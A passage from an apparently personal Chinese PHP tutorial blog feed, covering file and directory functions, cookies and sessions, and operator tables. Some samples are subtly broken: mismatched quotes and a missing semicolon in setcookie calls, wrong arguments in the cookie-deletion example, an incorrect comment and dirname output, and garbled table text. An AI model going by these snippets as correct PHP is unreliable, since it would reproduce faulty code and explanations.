Sep 2020 7:16 PM</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>8.<code>stat()</code><br>获取文件大部分属性值</p><h2 id="三、目录的基本操作"><a href="#三、目录的基本操作" class="headerlink" title="三、目录的基本操作"></a>三、目录的基本操作</h2><p>1.<code>basename()</code><br>返回路径中的文件名部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">语法:basename(path)或basename(path,文件拓展名)  <br></code></pre></td></tr></table></figure><p>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;demo/test.php&quot;</span>;<br><span class="hljs-comment">//Show filename with file extension</span><br><span class="hljs-keyword">echo</span> basename(<span class="hljs-variable">$path</span>) .<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;  <span class="hljs-comment">//输出test.php</span><br>/Show filename without file extension<br><span class="hljs-keyword">echo</span> basename(<span class="hljs-variable">$path</span>,<span class="hljs-string">&quot;.php&quot;</span>);   <span class="hljs-comment">//输出 test</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2.<code>dirname()</code><br>返回路径中的目录部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">语法： dirname(path)<br></code></pre></td></tr></table></figure><p>案例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> dirname(<span class="hljs-string">&quot;c:/testweb/home.php&quot;</span>);  <span class="hljs-comment">//输出c:/testweb</span><br><span class="hljs-keyword">echo</span> dirname(<span class="hljs-string">&quot;/testweb/home.php&quot;</span>);   <span class="hljs-comment">//输出testweb</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>3.<code>pathinfo()</code><br>以数组的形式返回文件路径的信息。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">语法： pathinfo(path,options)<br></code></pre></td></tr></table></figure><p>用法：<br>pathinfo() 返回一个关联数组包含有 path 的信息。包括以下的数组元素：[dirname]（ 目录路径）、[basename] (文件名)、[extension]: (文件后缀名)、[filename] (不包含后缀的文件名)。<br>其中options为规定要返回的数组元素。默认是 all。<br>若出现<code>PATHINFO_DIRNAME</code> ， 则只返回 dirname<br>若出现<code>PATHINFO_BASENAME</code> ， 则只返回 basename<br>若出现<code>PATHINFO_EXTENSION</code> ，则只返回 extension</p><p>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>print_r(pathinfo(<span class="hljs-string">&quot;index.html&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">Array ( [dirname] =&gt; . [basename] =&gt; index.html [extension] =&gt; html [filename] =&gt; index )<br></code></pre></td></tr></table></figure><p>4.<code>opendir()</code><br>打开目录句柄</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">语法：opendir(path);<br><span class="hljs-comment">//path为规定要打开的目录路径。。</span><br></code></pre></td></tr></table></figure><p>5.<code>readdir()</code><br>从目录句柄中读取条目,返回目录中下一个文件的文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">readdir(dir_handle);<br><span class="hljs-comment">//dir_handle指定之前由 opendir() 打开的目录句柄资源。如果该参数未指定，则使用最后一个由 opendir() 打开的链接。</span><br></code></pre></td></tr></table></figure><p>6.<code>rewinddir()</code><br>倒回目录句柄</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">语法：rewinddir(dir_handle);<br><span class="hljs-comment">//rewinddir() 函数重置由 opendir() 创建的目录句柄。</span><br></code></pre></td></tr></table></figure><p>7.<code>closedir()</code><br>关闭目录句柄</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">语法：closedir(dir_handle);<br></code></pre></td></tr></table></figure><p>8.<code>mkdir()</code><br>新建目录，如果成功该函数返回 true，如果失败则返回 false。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">语法：mkdir(path,mode,recursive)<br></code></pre></td></tr></table></figure><p>9.<code>rmdir()</code><br>删除指定的空目录，如果成功该函数返回 true，如果失败则返回 false。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">语法：rmdir(dir)<br></code></pre></td></tr></table></figure><p>10.<code>scandir()</code><br>返回指定目录中的文件和目录的数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">语法：scandir(<span class="hljs-built_in">directory</span>,sorting_order);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">directory为要扫描的目录。</span><br><span class="hljs-comment">sorting_order为排列顺序。默认是 0，表示按字母升序排列。</span><br><span class="hljs-comment">如果设置为 sorting_order_descending 或者 1，则表示按字母降序排列。</span><br><span class="hljs-comment">如果设置为 sorting_order_none，则返回未排列的结果。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="四、文件的基本操作"><a href="#四、文件的基本操作" class="headerlink" title="四、文件的基本操作"></a>四、文件的基本操作</h2><p>1.<code>fopen():</code> 打开文件或者 URL<br>  fopen()函数的参数是目标文件的路径和文件的读写模式；同时fopen函数也会     在打开文件时候发现没有文件会自动创建一个文件，但是模式必须是读写或写入的模式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file</span>=fopen(<span class="hljs-string">&quot;D:/test/file.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-comment">//使用绝对路径打开一个文件，选择只读模式，并返回资源$file</span><br><span class="hljs-variable">$file</span>=fopen(<span class="hljs-string">&quot;http://www.test.com&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-comment">//打开远程文件，使用http协议只能以读的方式打开</span><br></code></pre></td></tr></table></figure><p>2<code>.fread()</code>:读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">fread(<span class="hljs-variable">$file</span>,filesize(<span class="hljs-string">&quot;file.txt&quot;</span>));<br></code></pre></td></tr></table></figure><p>fread()函数的参数是需要读取的文件和文件读取的最大字节数</p><p>3.<code>fgets():</code>从文件指针中读取一行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">fgets(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>读取文件中的单行文字，没读取一次就会将文件指针指向下一行的首部</p><p><code> fgetc()</code>:读取单个字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">fgetc(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>fgetc()函数将会逐个字符的读取内容输出；</p><p><code>4.feof()</code>:检查文件指针是否到了文件结束的位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">feof(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>feof()函数的主要功能是检查文件中的指针是否到达文件末尾，可以借此来解决未知大小的文件读写防止越界的问题</p><p><code>5.fwrite()</code>:写入文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">fwrite(file,<span class="hljs-keyword">string</span>,length)<br></code></pre></td></tr></table></figure><p>fwrite() 返回写入的字符数，出现错误时则返回 false。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = fopen(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-keyword">echo</span> fwrite(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;Hello World&quot;</span>);<br>fclose(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//输出</span><br><span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><p>6.<code>rewind()</code><br>倒回文件指针的位置</p><p>7.<code>flock()</code><br>轻便的咨询文件锁定</p><p>8.<code>ftruncate()</code><br>将文件截断到给定的长度</p><p>9.<code>fclose()</code>：关闭一个已打开的文件指针</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">fclose(file)<br></code></pre></td></tr></table></figure><p>file 参数是一个文件指针,fclose() 函数关闭该指针指向的文件。如果成功则返回 true，否则返回 false。</p><p>10.<code>file()</code> :把整个文件读入一个数组中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file(path)<br></code></pre></td></tr></table></figure><p>file() 将文件作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。如果失败，则返回 false。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>print_r(file(<span class="hljs-string">&quot;test.txt&quot;</span>));<br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//输出</span><br><span class="hljs-keyword">Array</span> ( [<span class="hljs-number">0</span>] =&gt; Hello World [<span class="hljs-number">1</span>] =&gt; abc [<span class="hljs-number">2</span>] =&gt; fe [<span class="hljs-number">3</span>] =&gt; vdf )<br></code></pre></td></tr></table></figure><p>11.<code>copy()</code>：拷贝文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">copy(source,destination)<br><span class="hljs-comment">//source 为要复制的文件，destination为复制文件的目的地。</span><br></code></pre></td></tr></table></figure><p>将文件从 source 拷贝到 destination。如果成功则返回 TRUE，否则返回 FALSE。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> copy(<span class="hljs-string">&quot;a.txt&quot;</span>,<span class="hljs-string">&quot;b.txt&quot;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>12.<code>unlink()</code>：删除文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">unlink(filename)<br></code></pre></td></tr></table></figure><p>删除文件若成功，则返回 true，失败则返回 false。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;test.txt&quot;</span>;<br><span class="hljs-keyword">if</span> (!unlink(<span class="hljs-variable">$file</span>))<br>  &#123;<br>  <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;Error deleting <span class="hljs-subst">$file</span>&quot;</span>);<br>  &#125;<br><span class="hljs-keyword">else</span><br>  &#123;<br>  <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;Deleted <span class="hljs-subst">$file</span>&quot;</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>13.<code>file_get_contents()</code>：将整个文件读入一个字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file_get_contents(path)<br></code></pre></td></tr></table></figure><p>14.<code>file_put_contents()</code>：将字符串写入文件中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file_put_contents(file,data)<br></code></pre></td></tr></table></figure><p>file_put_contents() 函数把一个字符串写入文件中。与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> file_put_contents(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;Hello World!&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>15.<code>rename()</code>：重命名一个文件或目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">rename(oldname,newname)<br><span class="hljs-comment">//oldname 要重命名的文件或目录。newname 文件或目录的新名称。</span><br></code></pre></td></tr></table></figure><p>16.<code>readfile()</code>;读入一个文件并写入到输出缓冲</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">readfile(filename)<br></code></pre></td></tr></table></figure><p>该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> readfile(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//输出</span><br>Hello World!<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程开发</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP cookie与session</title>
    <link href="/2020/09/03/PHP%20cookie%E4%B8%8Esession/"/>
    <url>/2020/09/03/PHP%20cookie%E4%B8%8Esession/</url>
    
    <content type="html"><![CDATA[<p>摘要：PHP学习笔记（三）</p> <a id="more"></a><p>一、cookie</p><blockquote><p>Cookie是用来将网站的资料记录在客户端的技术，这种技术让Wleb服务器能将一些资料，存放于客户端（用户的电脑）之中。<br>比如:当通过验证,成功登录网站后，在”网页一“的PHP脚本中，会把这个用户<br>有关的信息，设置到客户端电脑的Cookie中，当再次访问同一个网站中的其他脚本时，就会自动携带Cookie中的数据一起访问，在服务器中的每个脚本中都可以接受Cookie中的数据，不需要每访问一个页面就重新输入一次登录者的信息。</p></blockquote><ol><li>向客户端电脑中设置Cockie<br>PHP中<code>setcookie()</code> 函数用于设置 cookie。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//语法</span><br>setcookie(name, value, expire, path, domain);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200903161113188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>setcookie(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;zhangsan&quot;,time()+60*60);</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>在服务器端上读取Cookie的内容<br>PHP 的 <code>$_COOKIE</code> 变量用于取回 cookie 的值。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 输出 cookie 值</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;user&quot;</span>];<br><span class="hljs-comment">// 查看所有 cookie</span><br>print_r(<span class="hljs-variable">$_COOKIE</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li>多维数组应用于Cookie中</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>setcookie(<span class="hljs-string">&quot;member[name]&quot;</span>,<span class="hljs-string">&#x27;zhangsan&#x27;</span>,time()+<span class="hljs-number">60</span>*<span class="hljs-number">60</span>)<br>setcookie(<span class="hljs-string">&quot;member[email]&quot;</span>,<span class="hljs-string">&#x27;666666@qq.com&#x27;</span>,time()+<span class="hljs-number">60</span>*<span class="hljs-number">60</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol start="4"><li>删除Cookie</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 设置 cookie 过期时间为过去 1 小时</span><br>setcookie(<span class="hljs-string">&quot;member&quot;</span>,time()<span class="hljs-number">-3600</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>二、session</p><blockquote><p>您在计算机上操作某个应用程序时，您打开它，做些更改，然后关闭它。这很像一次对话（Session）。计算机知道您是谁。它清楚您在何时打开和关闭应用程序。然而，在因特网上问题出现了：由于HTTP 地址无法保持状态，Web 服务器并不知道您是谁以及您做了什么。<br>PHP session 解决了这个问题，它通过在服务器上存储用户信息以便随后使用（比如用户名称、购买商品等）。然而，会话信息是临时的，在用户离开网站后将被删除。如果您需要永久存储信息，可以把数据存储在数据库中。</p><p>Session 的工作机制是：为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie中，或者通过 URL 进行传导。</p></blockquote><ol><li>开启session</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start(); <span class="hljs-comment">//弃启一个会话，或者返回已经存在的会话</span><br><span class="hljs-meta">?&gt;</span>;<br></code></pre></td></tr></table></figure><ol start="2"><li>使用session存储数据</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-string">&#x27;zhangsan&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;email&#x27;</span>]=<span class="hljs-string">&#x27;666666@qq.com&#x27;</span>;<br><span class="hljs-meta">?&gt;</span>;<br></code></pre></td></tr></table></figure><ol start="3"><li>注销变量与销毁session<br>删除某些 session 数据，可以使用 <code>unset()</code> 或 <code>session_destroy()</code> 函数。</li></ol><p>实例1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<span class="hljs-comment">//打开要销毁的会话!</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;views&#x27;</span>]))<br>&#123;<br>   <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;views&#x27;</span>]);<span class="hljs-comment">//Free all session variables</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>实例2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_destroy();<span class="hljs-comment">//销毁一个会话中的全部数据</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程开发</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP 运算符</title>
    <link href="/2020/05/22/PHP%20%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
    <url>/2020/05/22/PHP%20%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<p>摘要：PHP学习笔记（二）</p> <a id="more"></a><h2 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h2><table><thead><tr><th>例子</th><th>名称</th><th>结果</th></tr></thead><tbody><tr><td>-$a</td><td>取反</td><td>a的相反数</td></tr><tr><td>$a + $b</td><td>加法</td><td>a 和a和b 的和</td></tr><tr><td>$a - $b</td><td>减法</td><td>a 和a和b 的差</td></tr><tr><td>$a * $b</td><td>乘法</td><td>a 和a和b 的积</td></tr><tr><td>$a / $b</td><td>除法</td><td>a 和a和b 的商</td></tr><tr><td>$a % $b</td><td>取余</td><td>a 除以a除以b 的余数</td></tr><tr><td>$a ** $b</td><td>乘方</td><td>a 的a的b 次方</td></tr><tr><td>++$a</td><td>前加</td><td>a的值加1，然后返回a</td></tr><tr><td>$a ++</td><td>后加</td><td>返回a,然后将a的值加1</td></tr><tr><td>–$a</td><td>前减</td><td>a的值减1，然后返回a</td></tr><tr><td>$a–</td><td>后减</td><td>返回a,然后将a的值减1</td></tr></tbody></table><h2 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h2><p>有两个字符串运算符。</p><p>第一个是连接运算符<font color=#FF0000 size=3>.</font>，它返回其左右参数连接后的字符串<br>第二个是连接赋值运算符<font color=#FF0000 size=3>.=</font>，它将右边参数附加到左边的参数后。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Hello &quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span> . <span class="hljs-string">&quot;PHP!&quot;</span>; <span class="hljs-comment">// now $b contains &quot;Hello World!&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Hello &quot;</span>;<br><span class="hljs-variable">$a</span> .= <span class="hljs-string">&quot;World!&quot;</span>;     <span class="hljs-comment">// now $a contains &quot;Hello World!&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Hello PHP!Hello World!<br></code></pre></td></tr></table></figure><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><p>左边的操作数必须是变量,右边可以是一个表达式，也可以是一个值，一个变量等等。</p><p>作用:将右边表达式的值赋給左边变量</p><blockquote><p>赋值+=  ，比如a+=b,就是a=a+b。<br>赋值-=  ，比如a-=b,就是a=a-b<br>赋值*=  ，比如a*=b,就是a=a*b<br>赋值/=  ，比如a/=b,就是a=a/b<br>赋值%=  ，比如a%=b,就是a=a%b</p></blockquote><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>比较运算符也称关系运算符，又称条件运算符,用于对运算符两边的操作数进行比较<br>比较的结果只能是布尔值。对操作数(按照比较运算符的要求规则)进行比较。如果比较出的结果满足比较运算符的要求那么结果就是true(真，成立，满足),否则就是false(假，不成立,不满足)</p><table><thead><tr><th></th><th>表达式</th><th>含义</th><th>结果</th><th></th></tr></thead><tbody><tr><td></td><td>$a == $b</td><td>等于</td><td>如果类型转换后 a 等于a等于b，返回 true。</td><td></td></tr><tr><td></td><td>$a === $b</td><td>全等</td><td>如果 a 等于a等于b，并且它们的类型也相同，返回true。</td><td></td></tr><tr><td></td><td>$a != $b</td><td>不等</td><td>如果类型转换后 a 不等于a不等于b，返回 true。</td><td></td></tr><tr><td></td><td>$a &lt;&gt; $b</td><td>不等</td><td>如果类型转换后 a 不等于a不等于b，返回true。</td><td></td></tr><tr><td></td><td>$a !== $b</td><td>不全等</td><td>如果 a 和a和b 的值或类型不同，返回 true。</td><td></td></tr><tr><td></td><td>$a &lt; $b</td><td>小于</td><td>如果 a 小于a小于b，返回 true。</td><td></td></tr><tr><td></td><td>$a &gt; $b</td><td>大于</td><td>如果 a 大于a大于b，返回 true。</td><td></td></tr><tr><td></td><td>$a &lt;= $b</td><td>小于等于</td><td>如果 a 小于或者等于a小于或者等于b，返回true。</td><td></td></tr><tr><td></td><td>$a &gt;= $b</td><td>大于等于</td><td>如果 a 大于或者等于a大于或者等于b，返回 true。</td><td></td></tr></tbody></table><p>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-number">11</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;11&#x27;</span> ;<br><span class="hljs-comment">//var_dump($a==$b) ;//true</span><br>var_dump(<span class="hljs-variable">$a</span>===<span class="hljs-variable">$b</span>) ;<span class="hljs-comment">//false</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>对表达式进行逻辑运算，运算出的结果是布尔类型的值(true, false)</p><p> 要求:参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被自动转换成布尔类型的值，然后再参与运算!</p><table><thead><tr><th></th><th>表达式</th><th>含义</th><th>结果</th><th></th></tr></thead><tbody><tr><td></td><td>$a and $b</td><td>and(逻辑与)</td><td>当两边操作数都为true时，返回true，否则返回false</td><td></td></tr><tr><td></td><td>$a or $b</td><td>or (逻辑或)</td><td>当两边操作都为false时，返回false，否则返回true</td><td></td></tr><tr><td></td><td>$a xor $b</td><td>xor (逻辑异或)</td><td>当两边操作数只有一个为true时，返回true，否则返回false</td><td></td></tr><tr><td></td><td>!$a</td><td>not (逻辑非)</td><td>当操作为true时返回false，否则返回true</td><td></td></tr><tr><td></td><td>$a &amp;&amp; $b</td><td>and(逻辑与)</td><td>当两边操作数都为true时，返回true，否则返回false</td><td></td></tr><tr><td></td><td>$a II $b</td><td>or (逻辑或)</td><td>当两边操作都为false时，返回false，否则返回true</td><td></td></tr></tbody></table><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><ol><li><p><font color=#ff0000 size=3>&amp;</font>    按位与<br>只有参与运算的两位都为1时，运算结果才为1，否则为0</p></li><li><p><font color=#ff0000 size=3>|    </font> 按位或<br>只有参与运算的两位都为0时，运算结果才为0，否则为1</p></li><li><p><font 